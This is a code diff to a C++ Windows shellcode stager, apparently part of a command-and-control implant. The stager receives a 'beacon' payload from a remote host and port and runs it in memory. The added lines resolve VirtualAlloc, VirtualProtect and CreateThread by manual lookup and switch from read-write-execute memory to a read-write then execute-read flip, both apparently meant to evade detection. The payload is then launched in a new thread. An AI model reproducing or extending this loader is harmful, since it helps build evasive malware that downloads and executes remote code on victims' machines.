@@ -12,13 +12,20 @@
 // TODO: eventually convert to c code then asm then shell code?
 
 #include "stager.h"
+#include "../utils/utils.h"
 #include <iostream>
+
+
 
 #pragma comment(lib, "ws2_32.lib")
 
 bool Stager::run(const std::string& host, const std::string& port)
 {
     // 1. manually resolve apis (skip for now and just include the headers that import it)
+
+    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
+    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
+    FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
 
     std::cout << "1 - Starting" << std::endl;
     
@@ -77,7 +84,8 @@ bool Stager::run(const std::string& host, const std::string& port)
 
     std::cout << "5 - Received " << bytes_received << " bytes" << std::endl;
 
-    LPVOID beacon_mem = VirtualAlloc(0, bytes_received, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    //LPVOID beacon_mem = VirtualAlloc(0, bytes_received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID beacon_mem = pVirtualAlloc(0, bytes_received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!beacon_mem) {
         std::cout << "VirtualAlloc failed: " << GetLastError() << std::endl;
         return false;
@@ -85,10 +93,19 @@ bool Stager::run(const std::string& host, const std::string& port)
 
     memcpy(beacon_mem, shellcode.data(), bytes_received);
 
+    // EXECUTE_READ.
+    DWORD old_prot;
+    if (VirtualProtect(beacon_mem, bytes_received, PAGE_EXECUTE_READ, &old_prot) == FALSE)
+    {
+        // Fail silently if we cannot make the memory executable.
+        return 1;
+    }
+
     std::cout << "6 - Memory allocated and copied" << std::endl;
 
     // 4.
-    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
+    //HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
+    HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
     if (!thread) {
         std::cout << "CreateThread failed: " << GetLastError() << std::endl;
         return false;
